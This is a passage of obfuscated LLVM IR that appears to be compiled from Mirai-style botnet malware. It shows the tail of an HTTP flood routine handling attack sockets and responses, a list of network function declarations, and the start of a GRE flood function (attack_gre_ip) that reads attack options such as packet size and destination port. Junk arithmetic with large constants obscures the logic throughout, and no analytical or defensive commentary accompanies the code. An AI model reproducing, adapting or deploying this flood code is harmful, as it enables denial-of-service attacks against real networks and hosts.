  %2450 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2449, i32 0, i32 17
  %2451 = load i32, i32* %2450, align 4
  %2452 = load i32, i32* %60, align 4
  %2453 = sub i32 0, %2452
  %2454 = add i32 %2451, %2453
  %2455 = sub nsw i32 %2451, %2452
  %2456 = call i32 @util_memsearch(i8* %2448, i32 %2454, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.13, i32 0, i32 0), i32 1)
  store i32 %2456, i32* %61, align 4
  %2457 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2458 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2457, i32 0, i32 18
  %2459 = load i32, i32* %60, align 4
  %2460 = load i32, i32* %61, align 4
  %2461 = sub i32 %2460, -802081074
  %2462 = sub i32 %2461, 1
  %2463 = add i32 %2462, -802081074
  %2464 = sub nsw i32 %2460, 1
  %2465 = sub i32 0, %2459
  %2466 = sub i32 0, %2463
  %2467 = add i32 %2465, %2466
  %2468 = sub i32 0, %2467
  %2469 = add nsw i32 %2459, %2463
  %2470 = sext i32 %2468 to i64
  %2471 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2458, i64 0, i64 %2470
  store i8 0, i8* %2471, align 1
  %2472 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2473 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2472, i32 0, i32 15
  %2474 = load i32, i32* %2473, align 4
  %2475 = icmp slt i32 %2474, 5
  br i1 %2475, label %2476, label %2587

; <label>:2476:                                   ; preds = %2435
  %2477 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2478 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2477, i32 0, i32 18
  %2479 = load i32, i32* %60, align 4
  %2480 = sext i32 %2479 to i64
  %2481 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2478, i64 0, i64 %2480
  %2482 = call i32 @util_strlen(i8* %2481)
  %2483 = icmp slt i32 %2482, 128
  br i1 %2483, label %2484, label %2587

; <label>:2484:                                   ; preds = %2476
  %2485 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2486 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2485, i32 0, i32 16
  %2487 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2488 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2487, i32 0, i32 15
  %2489 = load i32, i32* %2488, align 4
  %2490 = sext i32 %2489 to i64
  %2491 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %2486, i64 0, i64 %2490
  %2492 = getelementptr inbounds [128 x i8], [128 x i8]* %2491, i32 0, i32 0
  %2493 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2494 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2493, i32 0, i32 18
  %2495 = load i32, i32* %60, align 4
  %2496 = sext i32 %2495 to i64
  %2497 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2494, i64 0, i64 %2496
  %2498 = call i32 @util_strcpy(i8* %2492, i8* %2497)
  %2499 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2500 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2499, i32 0, i32 16
  %2501 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2502 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2501, i32 0, i32 15
  %2503 = load i32, i32* %2502, align 4
  %2504 = sext i32 %2503 to i64
  %2505 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %2500, i64 0, i64 %2504
  %2506 = getelementptr inbounds [128 x i8], [128 x i8]* %2505, i32 0, i32 0
  %2507 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2508 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2507, i32 0, i32 16
  %2509 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2510 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2509, i32 0, i32 15
  %2511 = load i32, i32* %2510, align 4
  %2512 = sext i32 %2511 to i64
  %2513 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %2508, i64 0, i64 %2512
  %2514 = getelementptr inbounds [128 x i8], [128 x i8]* %2513, i32 0, i32 0
  %2515 = call i32 @util_strlen(i8* %2514)
  %2516 = sext i32 %2515 to i64
  %2517 = getelementptr inbounds i8, i8* %2506, i64 %2516
  %2518 = call i32 @util_strcpy(i8* %2517, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.14, i32 0, i32 0))
  %2519 = load i32, i32* %61, align 4
  %2520 = add i32 %2519, 717138919
  %2521 = add i32 %2520, 3
  %2522 = sub i32 %2521, 717138919
  %2523 = add nsw i32 %2519, 3
  %2524 = load i32, i32* %60, align 4
  %2525 = sub i32 0, %2522
  %2526 = sub i32 %2524, %2525
  %2527 = add nsw i32 %2524, %2522
  store i32 %2526, i32* %60, align 4
  %2528 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2529 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2528, i32 0, i32 18
  %2530 = load i32, i32* %60, align 4
  %2531 = sext i32 %2530 to i64
  %2532 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2529, i64 0, i64 %2531
  %2533 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2534 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2533, i32 0, i32 17
  %2535 = load i32, i32* %2534, align 4
  %2536 = load i32, i32* %60, align 4
  %2537 = add i32 %2535, 1982926618
  %2538 = sub i32 %2537, %2536
  %2539 = sub i32 %2538, 1982926618
  %2540 = sub nsw i32 %2535, %2536
  %2541 = call i32 @util_memsearch(i8* %2532, i32 %2539, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.13, i32 0, i32 0), i32 1)
  store i32 %2541, i32* %61, align 4
  %2542 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2543 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2542, i32 0, i32 18
  %2544 = load i32, i32* %60, align 4
  %2545 = load i32, i32* %61, align 4
  %2546 = sub i32 0, 1
  %2547 = add i32 %2545, %2546
  %2548 = sub nsw i32 %2545, 1
  %2549 = sub i32 %2544, -1604626703
  %2550 = add i32 %2549, %2547
  %2551 = add i32 %2550, -1604626703
  %2552 = add nsw i32 %2544, %2547
  %2553 = sext i32 %2551 to i64
  %2554 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2543, i64 0, i64 %2553
  store i8 0, i8* %2554, align 1
  %2555 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2556 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2555, i32 0, i32 16
  %2557 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2558 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2557, i32 0, i32 15
  %2559 = load i32, i32* %2558, align 4
  %2560 = sext i32 %2559 to i64
  %2561 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %2556, i64 0, i64 %2560
  %2562 = getelementptr inbounds [128 x i8], [128 x i8]* %2561, i32 0, i32 0
  %2563 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2564 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2563, i32 0, i32 16
  %2565 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2566 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2565, i32 0, i32 15
  %2567 = load i32, i32* %2566, align 4
  %2568 = sext i32 %2567 to i64
  %2569 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %2564, i64 0, i64 %2568
  %2570 = getelementptr inbounds [128 x i8], [128 x i8]* %2569, i32 0, i32 0
  %2571 = call i32 @util_strlen(i8* %2570)
  %2572 = sext i32 %2571 to i64
  %2573 = getelementptr inbounds i8, i8* %2562, i64 %2572
  %2574 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2575 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2574, i32 0, i32 18
  %2576 = load i32, i32* %60, align 4
  %2577 = sext i32 %2576 to i64
  %2578 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2575, i64 0, i64 %2577
  %2579 = call i32 @util_strcpy(i8* %2573, i8* %2578)
  %2580 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2581 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2580, i32 0, i32 15
  %2582 = load i32, i32* %2581, align 4
  %2583 = add i32 %2582, 2027858674
  %2584 = add i32 %2583, 1
  %2585 = sub i32 %2584, 2027858674
  %2586 = add nsw i32 %2582, 1
  store i32 %2585, i32* %2581, align 4
  br label %2587

; <label>:2587:                                   ; preds = %2484, %2476, %2435
  %2588 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2589 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2588, i32 0, i32 14
  store i32 -1, i32* %2589, align 4
  %2590 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2591 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2590, i32 0, i32 1
  store i8 10, i8* %2591, align 4
  br label %2725

; <label>:2592:                                   ; preds = %2425
  br label %2593

; <label>:2593:                                   ; preds = %2592, %2412
  br label %2594

; <label>:2594:                                   ; preds = %2593, %2391
  %2595 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2596 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2595, i32 0, i32 14
  %2597 = load i32, i32* %2596, align 4
  %2598 = icmp eq i32 %2597, 0
  br i1 %2598, label %2599, label %2685

; <label>:2599:                                   ; preds = %2594
  %2600 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2601 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2600, i32 0, i32 13
  %2602 = load i32, i32* %2601, align 4
  %2603 = icmp eq i32 %2602, 1
  br i1 %2603, label %2604, label %2665

; <label>:2604:                                   ; preds = %2599
  %2605 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2606 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2605, i32 0, i32 18
  %2607 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2606, i32 0, i32 0
  %2608 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2609 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2608, i32 0, i32 17
  %2610 = load i32, i32* %2609, align 4
  %2611 = call i32 @util_memsearch(i8* %2607, i32 %2610, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  %2612 = icmp ne i32 %2611, -1
  br i1 %2612, label %2613, label %2664

; <label>:2613:                                   ; preds = %2604
  %2614 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2615 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2614, i32 0, i32 18
  %2616 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2615, i32 0, i32 0
  %2617 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2618 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2617, i32 0, i32 17
  %2619 = load i32, i32* %2618, align 4
  %2620 = call i32 @util_memsearch(i8* %2616, i32 %2619, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %2620, i32* %62, align 4
  %2621 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2622 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2621, i32 0, i32 18
  %2623 = load i32, i32* %62, align 4
  %2624 = sub i32 0, 2
  %2625 = add i32 %2623, %2624
  %2626 = sub nsw i32 %2623, 2
  %2627 = sext i32 %2625 to i64
  %2628 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2622, i64 0, i64 %2627
  store i8 0, i8* %2628, align 1
  %2629 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2630 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2629, i32 0, i32 18
  %2631 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2630, i32 0, i32 0
  %2632 = load i32, i32* %62, align 4
  %2633 = call i32 @util_memsearch(i8* %2631, i32 %2632, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i32 0, i32 0), i32 1)
  %2634 = icmp ne i32 %2633, -1
  br i1 %2634, label %2635, label %2645

; <label>:2635:                                   ; preds = %2613
  %2636 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2637 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2636, i32 0, i32 18
  %2638 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2639 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2638, i32 0, i32 18
  %2640 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2639, i32 0, i32 0
  %2641 = load i32, i32* %62, align 4
  %2642 = call i32 @util_memsearch(i8* %2640, i32 %2641, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i32 0, i32 0), i32 1)
  %2643 = sext i32 %2642 to i64
  %2644 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2637, i64 0, i64 %2643
  store i8 0, i8* %2644, align 1
  br label %2645

; <label>:2645:                                   ; preds = %2635, %2613
  %2646 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2647 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2646, i32 0, i32 18
  %2648 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2647, i32 0, i32 0
  %2649 = call i32 @util_atoi(i8* %2648, i32 16)
  store i32 %2649, i32* %63, align 4
  %2650 = load i32, i32* %63, align 4
  %2651 = icmp eq i32 %2650, 0
  br i1 %2651, label %2652, label %2655

; <label>:2652:                                   ; preds = %2645
  %2653 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2654 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2653, i32 0, i32 1
  store i8 1, i8* %2654, align 4
  br label %2725

; <label>:2655:                                   ; preds = %2645
  %2656 = load i32, i32* %63, align 4
  %2657 = sub i32 %2656, 1166270695
  %2658 = add i32 %2657, 2
  %2659 = add i32 %2658, 1166270695
  %2660 = add nsw i32 %2656, 2
  %2661 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2662 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2661, i32 0, i32 14
  store i32 %2659, i32* %2662, align 4
  %2663 = load i32, i32* %62, align 4
  store i32 %2663, i32* %59, align 4
  br label %2664

; <label>:2664:                                   ; preds = %2655, %2604
  br label %2684

; <label>:2665:                                   ; preds = %2599
  %2666 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2667 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2666, i32 0, i32 17
  %2668 = load i32, i32* %2667, align 4
  %2669 = load i32, i32* %59, align 4
  %2670 = sub i32 %2668, 2008224624
  %2671 = sub i32 %2670, %2669
  %2672 = add i32 %2671, 2008224624
  %2673 = sub nsw i32 %2668, %2669
  %2674 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2675 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2674, i32 0, i32 14
  store i32 %2672, i32* %2675, align 4
  %2676 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2677 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2676, i32 0, i32 14
  %2678 = load i32, i32* %2677, align 4
  %2679 = icmp eq i32 %2678, 0
  br i1 %2679, label %2680, label %2683

; <label>:2680:                                   ; preds = %2665
  %2681 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2682 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2681, i32 0, i32 1
  store i8 1, i8* %2682, align 4
  br label %2725

; <label>:2683:                                   ; preds = %2665
  br label %2684

; <label>:2684:                                   ; preds = %2683, %2664
  br label %2685

; <label>:2685:                                   ; preds = %2684, %2594
  %2686 = load i32, i32* %59, align 4
  %2687 = icmp eq i32 %2686, 0
  br i1 %2687, label %2688, label %2689

; <label>:2688:                                   ; preds = %2685
  br label %2725

; <label>:2689:                                   ; preds = %2685
  %2690 = load i32, i32* %59, align 4
  %2691 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2692 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2691, i32 0, i32 17
  %2693 = load i32, i32* %2692, align 4
  %2694 = add i32 %2693, -746483147
  %2695 = sub i32 %2694, %2690
  %2696 = sub i32 %2695, -746483147
  %2697 = sub nsw i32 %2693, %2690
  store i32 %2696, i32* %2692, align 4
  %2698 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2699 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2698, i32 0, i32 18
  %2700 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2699, i32 0, i32 0
  %2701 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2702 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2701, i32 0, i32 18
  %2703 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2702, i32 0, i32 0
  %2704 = load i32, i32* %59, align 4
  %2705 = sext i32 %2704 to i64
  %2706 = getelementptr inbounds i8, i8* %2703, i64 %2705
  %2707 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2708 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2707, i32 0, i32 17
  %2709 = load i32, i32* %2708, align 4
  %2710 = sext i32 %2709 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %2700, i8* %2706, i64 %2710, i32 1, i1 false)
  %2711 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2712 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2711, i32 0, i32 18
  %2713 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2714 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2713, i32 0, i32 17
  %2715 = load i32, i32* %2714, align 4
  %2716 = sext i32 %2715 to i64
  %2717 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2712, i64 0, i64 %2716
  store i8 0, i8* %2717, align 1
  %2718 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2719 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2718, i32 0, i32 17
  %2720 = load i32, i32* %2719, align 4
  %2721 = icmp eq i32 %2720, 0
  br i1 %2721, label %2722, label %2723

; <label>:2722:                                   ; preds = %2689
  br label %2725

; <label>:2723:                                   ; preds = %2689
  br label %2724

; <label>:2724:                                   ; preds = %2723
  br label %2391

; <label>:2725:                                   ; preds = %2722, %2688, %2680, %2652, %2587
  br label %2304

; <label>:2726:                                   ; preds = %2377, %2310
  br label %2779

; <label>:2727:                                   ; preds = %2297
  %2728 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2729 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2728, i32 0, i32 1
  %2730 = load i8, i8* %2729, align 4
  %2731 = zext i8 %2730 to i32
  %2732 = icmp eq i32 %2731, 10
  br i1 %2732, label %2733, label %2778

; <label>:2733:                                   ; preds = %2727
  br label %2734

; <label>:2734:                                   ; preds = %2767, %2733
  %2735 = call i32* @__errno_location() #7
  store i32 0, i32* %2735, align 4
  %2736 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2737 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2736, i32 0, i32 0
  %2738 = load i32, i32* %2737, align 4
  %2739 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %2740 = call i64 @recv(i32 %2738, i8* %2739, i64 10240, i32 16384)
  %2741 = trunc i64 %2740 to i32
  store i32 %2741, i32* %12, align 4
  %2742 = load i32, i32* %12, align 4
  %2743 = icmp eq i32 %2742, 0
  br i1 %2743, label %2744, label %2746

; <label>:2744:                                   ; preds = %2734
  %2745 = call i32* @__errno_location() #7
  store i32 104, i32* %2745, align 4
  store i32 -1, i32* %12, align 4
  br label %2746

; <label>:2746:                                   ; preds = %2744, %2734
  %2747 = load i32, i32* %12, align 4
  %2748 = icmp eq i32 %2747, -1
  br i1 %2748, label %2749, label %2767

; <label>:2749:                                   ; preds = %2746
  %2750 = call i32* @__errno_location() #7
  %2751 = load i32, i32* %2750, align 4
  %2752 = icmp ne i32 %2751, 11
  br i1 %2752, label %2753, label %2766

; <label>:2753:                                   ; preds = %2749
  %2754 = call i32* @__errno_location() #7
  %2755 = load i32, i32* %2754, align 4
  %2756 = icmp ne i32 %2755, 11
  br i1 %2756, label %2757, label %2766

; <label>:2757:                                   ; preds = %2753
  %2758 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2759 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2758, i32 0, i32 0
  %2760 = load i32, i32* %2759, align 4
  %2761 = call i32 @close(i32 %2760)
  %2762 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2763 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2762, i32 0, i32 0
  store i32 -1, i32* %2763, align 4
  %2764 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2765 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2764, i32 0, i32 1
  store i8 0, i8* %2765, align 4
  br label %2766

; <label>:2766:                                   ; preds = %2757, %2753, %2749
  br label %2768

; <label>:2767:                                   ; preds = %2746
  br label %2734

; <label>:2768:                                   ; preds = %2766
  %2769 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2770 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2769, i32 0, i32 1
  %2771 = load i8, i8* %2770, align 4
  %2772 = zext i8 %2771 to i32
  %2773 = icmp ne i32 %2772, 0
  br i1 %2773, label %2774, label %2777

; <label>:2774:                                   ; preds = %2768
  %2775 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2776 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2775, i32 0, i32 1
  store i8 1, i8* %2776, align 4
  br label %2777

; <label>:2777:                                   ; preds = %2774, %2768
  br label %2778

; <label>:2778:                                   ; preds = %2777, %2727
  br label %2779

; <label>:2779:                                   ; preds = %2778, %2726
  br label %2780

; <label>:2780:                                   ; preds = %2779, %2288
  br label %2781

; <label>:2781:                                   ; preds = %2780, %1119
  br label %2782

; <label>:2782:                                   ; preds = %2781, %2248, %1852, %1171, %1154, %1109, %1074
  %2783 = load i32, i32* %9, align 4
  %2784 = add i32 %2783, 51326353
  %2785 = add i32 %2784, 1
  %2786 = sub i32 %2785, 51326353
  %2787 = add nsw i32 %2783, 1
  store i32 %2786, i32* %9, align 4
  br label %1061

; <label>:2788:                                   ; preds = %1061
  br label %364

; <label>:2789:                                   ; preds = %104, %99, %94, %89
  ret void
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #5

declare i32 @util_strlen(i8*) #3

declare i32 @util_strcpy(i8*, i8*) #3

; Function Attrs: argmemonly nounwind
declare void @llvm.memmove.p0i8.p0i8.i64(i8* nocapture, i8* nocapture readonly, i64, i32, i1) #5

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #2

; Function Attrs: nounwind
declare i64 @time(i64*) #1

declare i32 @close(i32) #3

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #1

declare i32 @fcntl(i32, i32, ...) #3

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #1

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #2

declare i32 @connect(i32, %struct.sockaddr*, i32) #3

declare void @util_zero(i8*, i32) #3

declare i8* @util_itoa(i32, i32, i8*) #3

declare signext i8 @util_strcmp(i8*, i8*) #3

declare i64 @send(i32, i8*, i64, i32) #3

declare i32 @select(i32, %struct.fd_set*, %struct.fd_set*, %struct.fd_set*, %struct.timeval*) #3

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #1

declare i64 @recv(i32, i8*, i64, i32) #3

declare i32 @util_stristr(i8*, i32, i8*) #3

declare signext i8 @util_strncmp(i8*, i8*, i32) #3

declare i32 @sleep(i32) #3

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_gre_ip(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_target*, align 8
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_option*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i8**, align 8
  %14 = alloca i8, align 1
  %15 = alloca i16, align 2
  %16 = alloca i8, align 1
  %17 = alloca i8, align 1
  %18 = alloca i16, align 2
  %19 = alloca i16, align 2
  %20 = alloca i32, align 4
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca %struct.iphdr*, align 8
  %26 = alloca %struct.grehdr*, align 8
  %27 = alloca %struct.iphdr*, align 8
  %28 = alloca %struct.udphdr*, align 8
  %29 = alloca i8*, align 8
  %30 = alloca %struct.iphdr*, align 8
  %31 = alloca %struct.grehdr*, align 8
  %32 = alloca %struct.iphdr*, align 8
  %33 = alloca %struct.udphdr*, align 8
  %34 = alloca i8*, align 8
  %35 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %6, align 4
  store i8 %1, i8* %7, align 1
  store %struct.attack_target* %2, %struct.attack_target** %8, align 8
  store i8 %3, i8* %9, align 1
  store %struct.attack_option* %4, %struct.attack_option** %10, align 8
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %36 = load i8, i8* %7, align 1
  %37 = zext i8 %36 to i64
  %38 = call noalias i8* @calloc(i64 %37, i64 8) #6
  %39 = bitcast i8* %38 to i8**
  store i8** %39, i8*** %13, align 8
  %40 = load i8, i8* %9, align 1
  %41 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %42 = call i32 @attack_get_opt_int(i8 zeroext %40, %struct.attack_option* %41, i8 zeroext 2, i32 0)
  %43 = trunc i32 %42 to i8
  store i8 %43, i8* %14, align 1
  %44 = load i8, i8* %9, align 1
  %45 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %46 = call i32 @attack_get_opt_int(i8 zeroext %44, %struct.attack_option* %45, i8 zeroext 3, i32 65535)
  %47 = trunc i32 %46 to i16
  store i16 %47, i16* %15, align 2
  %48 = load i8, i8* %9, align 1
  %49 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %50 = call i32 @attack_get_opt_int(i8 zeroext %48, %struct.attack_option* %49, i8 zeroext 4, i32 64)
  %51 = trunc i32 %50 to i8
  store i8 %51, i8* %16, align 1
  %52 = load i8, i8* %9, align 1
  %53 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %54 = call i32 @attack_get_opt_int(i8 zeroext %52, %struct.attack_option* %53, i8 zeroext 5, i32 1)
  %55 = trunc i32 %54 to i8
  store i8 %55, i8* %17, align 1
  %56 = load i8, i8* %9, align 1
  %57 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %58 = call i32 @attack_get_opt_int(i8 zeroext %56, %struct.attack_option* %57, i8 zeroext 6, i32 65535)
  %59 = trunc i32 %58 to i16
  store i16 %59, i16* %18, align 2
  %60 = load i8, i8* %9, align 1
  %61 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %62 = call i32 @attack_get_opt_int(i8 zeroext %60, %struct.attack_option* %61, i8 zeroext 7, i32 65535)
  %63 = trunc i32 %62 to i16
  store i16 %63, i16* %19, align 2
  %64 = load i8, i8* %9, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %66 = call i32 @attack_get_opt_int(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 0, i32 512)
  store i32 %66, i32* %20, align 4
  %67 = load i8, i8* %9, align 1
  %68 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %69 = call i32 @attack_get_opt_int(i8 zeroext %67, %struct.attack_option* %68, i8 zeroext 1, i32 1)
  %70 = trunc i32 %69 to i8
  store i8 %70, i8* %21, align 1
  %71 = load i8, i8* %9, align 1
  %72 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %73 = call i32 @attack_get_opt_int(i8 zeroext %71, %struct.attack_option* %72, i8 zeroext 18, i32 0)
  %74 = trunc i32 %73 to i8
  store i8 %74, i8* %22, align 1
  %75 = load i8, i8* %9, align 1
  %76 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %77 = load i32, i32* @LOCAL_ADDR, align 4
  %78 = call i32 @attack_get_opt_int(i8 zeroext %75, %struct.attack_option* %76, i8 zeroext 24, i32 %77)
  store i32 %78, i32* %23, align 4
  %79 = call i64 @time(i64* null) #6
  %80 = load i32, i32* %6, align 4
  %81 = sext i32 %80 to i64
  %82 = sub i64 %79, -7169374817239379286
  %83 = add i64 %82, %81
  %84 = add i64 %83, -7169374817239379286
  %85 = add nsw i64 %79, %81
